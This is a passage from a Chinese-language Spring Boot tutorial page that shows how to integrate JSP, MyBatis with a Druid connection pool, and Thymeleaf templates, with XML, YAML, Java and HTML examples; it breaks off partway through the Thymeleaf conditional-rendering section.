   ////                   /  \\|||  :  |||//  \                        ////                  /  _||||| -:- |||||-  \                       ////                  |   | \\\  -  /// |   |                       ////                  | \_|  ''\---/''  |   |                       ////                  \  .-\__  `-`  ___/-. /                       ////                ___`. .'  /--.--\  `. . ___                     ////              ."" '&lt;  `.___\_&lt;|&gt;_/___.'  &gt;'"".                  ////            | | :  `- \`.;`\ _ /`;.`/ - ` : | |                 ////            \  \ `-.   \_ __\ /__ _/   .-` /  /                 ////      ========`-.____`-.___\_____/___.-`____.-'========         ////                           `=---='                              ////      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^        ////            佛祖保佑       永不宕机     永无BUG                   //////////////////////////////////////////////////////////////////////<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="五、SpringBoot整合JSP"><a href="#五、SpringBoot整合JSP" class="headerlink" title="五、SpringBoot整合JSP"></a>五、SpringBoot整合JSP</h2><blockquote><p>SpringBoot应用默认支持的动态网页技术是Thymeleaf，并不支持JSP；因此在SpringBoot应用想要使用JSP需要通过手动整合来实现</p></blockquote><h4 id="5-1-添加依赖"><a href="#5-1-添加依赖" class="headerlink" title="5.1 添加依赖"></a>5.1 添加依赖</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.tomcat.embed<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>tomcat-embed-jasper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>9.0.45<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jstl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-2-创建JSP页面"><a href="#5-2-创建JSP页面" class="headerlink" title="5.2 创建JSP页面"></a>5.2 创建JSP页面</h4><ul><li><p>修改pom文件打包方式为war</p></li><li><p>在main中创建webapp目录</p></li><li><p>在webapp创建.jsp页面</p></li></ul><h4 id="5-3-将JSP页面放在WEB-INF中的访问"><a href="#5-3-将JSP页面放在WEB-INF中的访问" class="headerlink" title="5.3 将JSP页面放在WEB-INF中的访问"></a>5.3 将JSP页面放在WEB-INF中的访问</h4><ul><li><p>将JSP文件存放到WEB-INF目录</p></li><li><p>在application.yml文件配置SpringMVC视图解析方式：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">mvc</span><span class="token punctuation">:</span>    <span class="token key atrule">view</span><span class="token punctuation">:</span>      <span class="token key atrule">prefix</span><span class="token punctuation">:</span> /WEB<span class="token punctuation">-</span>INF/      <span class="token key atrule">suffix</span><span class="token punctuation">:</span> .jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建PageController</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PageController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/index.html"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="六、基于SpringBoot的SSM整合"><a href="#六、基于SpringBoot的SSM整合" class="headerlink" title="六、基于SpringBoot的SSM整合"></a>六、基于SpringBoot的SSM整合</h2><h4 id="6-1-创建Springboot项目"><a href="#6-1-创建Springboot项目" class="headerlink" title="6.1 创建Springboot项目"></a>6.1 创建Springboot项目</h4><ul><li><p>创建项目时添加依赖</p><ul><li>lombok</li><li>spring web</li><li>mysql driver</li><li>mybatis framework</li></ul></li><li><p>修改mysql驱动的版本（可选）</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--pom.xml--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mysql.version</span><span class="token punctuation">&gt;</span></span>5.1.47<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mysql.version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="6-2-进行MyBatis所需的配置"><a href="#6-2-进行MyBatis所需的配置" class="headerlink" title="6.2 进行MyBatis所需的配置"></a>6.2 进行MyBatis所需的配置</h4><ul><li><p>将默认创建的application.properties后缀名修改为<code>yml</code>(根据习惯可选)</p></li><li><p>完成MyBatis的自定义配置</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">driver-class-name</span><span class="token punctuation">:</span> com.mysql.jdbc.Driver    <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/db_2010_mybatis<span class="token punctuation">?</span>characterEncoding=utf<span class="token punctuation">-</span><span class="token number">8</span>    <span class="token key atrule">username</span><span class="token punctuation">:</span> root    <span class="token key atrule">password</span><span class="token punctuation">:</span> admin123    <span class="token key atrule">mybatis</span><span class="token punctuation">:</span>  <span class="token key atrule">type-aliases-package</span><span class="token punctuation">:</span> com.qfedu.springboot.ssm.beans  <span class="token key atrule">mapper-locations</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>mappers/<span class="token important">*Mapper.xml</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="6-3-在启动类配置DAO扫描"><a href="#6-3-在启动类配置DAO扫描" class="headerlink" title="6.3 在启动类配置DAO扫描"></a>6.3 在启动类配置DAO扫描</h4><ul><li><code>@MapperScan</code></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@MapperScan</span><span class="token punctuation">(</span><span class="token string">"com.qfedu.springboot.ssm.dao"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringbootSsmApplication</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">SpringbootSsmApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-4-整合Druid连接池"><a href="#6-4-整合Druid连接池" class="headerlink" title="6.4 整合Druid连接池"></a>6.4 整合Druid连接池</h4><blockquote><p>在SpringBoot中整合MyBatis的时候，默认集成了Hikari连接池，Hikari的效率比Druid要高，但是得益于Druid提供了比较便捷的监控系统在企业开发中，druid使用还是最多的。</p></blockquote><h6 id="6-4-1-添加druid的starter"><a href="#6-4-1-添加druid的starter" class="headerlink" title="6.4.1 添加druid的starter"></a>6.4.1 添加druid的starter</h6><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>druid-spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.1.10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="6-4-2-配置druid数据源"><a href="#6-4-2-配置druid数据源" class="headerlink" title="6.4.2 配置druid数据源"></a>6.4.2 配置druid数据源</h6><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">druid</span><span class="token punctuation">:</span>      <span class="token key atrule">driver-class-name</span><span class="token punctuation">:</span> com.mysql.jdbc.Driver      <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/db_2010_mybatis<span class="token punctuation">?</span>characterEncoding=utf<span class="token punctuation">-</span><span class="token number">8</span>      <span class="token key atrule">username</span><span class="token punctuation">:</span> root      <span class="token key atrule">password</span><span class="token punctuation">:</span> admin123      <span class="token key atrule">initial-size</span><span class="token punctuation">:</span> <span class="token number">1</span>      <span class="token key atrule">min-idle</span><span class="token punctuation">:</span> <span class="token number">1</span>      <span class="token key atrule">max-active</span><span class="token punctuation">:</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="七、Thymeleaf"><a href="#七、Thymeleaf" class="headerlink" title="七、Thymeleaf"></a>七、Thymeleaf</h2><blockquote><p>Thymeleaf是一种类似于JSP的动态网页技术</p></blockquote><h4 id="7-1-Thymeleaf简介"><a href="#7-1-Thymeleaf简介" class="headerlink" title="7.1 Thymeleaf简介"></a>7.1 Thymeleaf简介</h4><ul><li>JSP 必须依赖Tomcat运行，不能直接运行在浏览器中</li><li>HTML可以直接运行在浏览器中，但是不能接收控制器传递的数据</li><li>Thymeleaf是一种既保留了HTML的后缀能够直接在浏览器运行的能力、又实现了JSP显示动态数据的功能——静能查看页面效果、动则可以显示数据</li></ul><h4 id="7-2-Thymeleaf的使用"><a href="#7-2-Thymeleaf的使用" class="headerlink" title="7.2 Thymeleaf的使用"></a>7.2 Thymeleaf的使用</h4><blockquote><p>SpringBoot应用对Thymeleaf提供了良好的支持</p></blockquote><h6 id="7-2-1-添加thymeleaf的starter"><a href="#7-2-1-添加thymeleaf的starter" class="headerlink" title="7.2.1 添加thymeleaf的starter"></a>7.2.1 添加thymeleaf的starter</h6><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-2-2-创建Thymeleaf模板"><a href="#7-2-2-创建Thymeleaf模板" class="headerlink" title="7.2.2 创建Thymeleaf模板"></a>7.2.2 创建Thymeleaf模板</h6><blockquote><p>Thymeleaf模板就是HTML文件</p></blockquote><ul><li><p>SpringBoot应用中 <code>resources\templates</code>目录就是用来存放页面模板的</p></li><li><p><code>重要说明：</code></p><ul><li>static 目录下的资源被定义静态资源，SpringBoot应用默认放行；如果将HTML页面创建static目录是可以直接访问的</li></ul></li><li><p>templates 目录下的文件会被定义为动态网页模板，SpringBoot应用会拦截templates中定义的资源；如果将HTML文件定义在templates目录，则必须通过控制器跳转访问。</p></li><li><p>在templates创建HTML页面模板</p></li><li><p>创建PageController，用于转发允许”直接访问”的页面请求</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/page"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PageController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test.html"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="7-3-Thymeleaf基本语法"><a href="#7-3-Thymeleaf基本语法" class="headerlink" title="7.3 Thymeleaf基本语法"></a>7.3 Thymeleaf基本语法</h4><blockquote><p>如果要在thymeleaf模板中获取从控制传递的数据，需要使用th标签</p></blockquote><h6 id="7-3-1-在thymeleaf模板页面引入th标签的命名空间"><a href="#7-3-1-在thymeleaf模板页面引入th标签的命名空间" class="headerlink" title="7.3.1 在thymeleaf模板页面引入th标签的命名空间"></a>7.3.1 在thymeleaf模板页面引入th标签的命名空间</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-3-2-th-text"><a href="#7-3-2-th-text" class="headerlink" title="7.3.2 th:text"></a>7.3.2 th:text</h6><blockquote><p>在几乎所有的HTML双标签都可以使用 th:text属性，将接收到的数据显示在标签的内容中</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${price}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${str}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${book.bookName}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h6 id="7-3-3-th-inline-内联"><a href="#7-3-3-th-inline-内联" class="headerlink" title="7.3.3 th:inline 内联"></a>7.3.3 th:inline 内联</h6><ul><li><p>HTML内联</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>inline</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>图书名称：[[${book.bookName}]]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>CSS内联</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>inline</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">    <span class="token selector">.style1</span><span class="token punctuation">{</span>        <span class="token selector">color:[[$</span><span class="token punctuation">{</span>color<span class="token punctuation">}</span>]]    <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>JavaScript内联</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/javascript<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>inline</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">   </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="7-3-4-th-object-和"><a href="#7-3-4-th-object-和" class="headerlink" title="7.3.4 th:object 和 *"></a>7.3.4 th:object 和 *</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>object</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${book}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*{bookId}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*{bookName}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*{bookAuthor}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="7-4-流程控制"><a href="#7-4-流程控制" class="headerlink" title="7.4 流程控制"></a>7.4 流程控制</h4><h6 id="7-4-1-th-each-循环"><a href="#7-4-1-th-each-循环" class="headerlink" title="7.4.1  th:each 循环"></a>7.4.1  th:each 循环</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> 600px</span><span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>caption</span><span class="token punctuation">&gt;</span></span>图书信息列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>caption</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>图书ID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>图书名称<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>作者<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thead</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name"><span class="token namespace">th:</span>each</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>b:${books}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${b.bookId}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${b.bookName}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${b.bookAuthor}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-4-2-分支"><a href="#7-4-2-分支" class="headerlink" title="7.4.2 分支"></a>7.4.2 分支</h6><ul><li><p>th:if 如果条件不成立，则不显示此标签</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${b.bookPrice}&gt;40<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>太贵！！！<span class="token tag"><span class="token tag"><span class="token 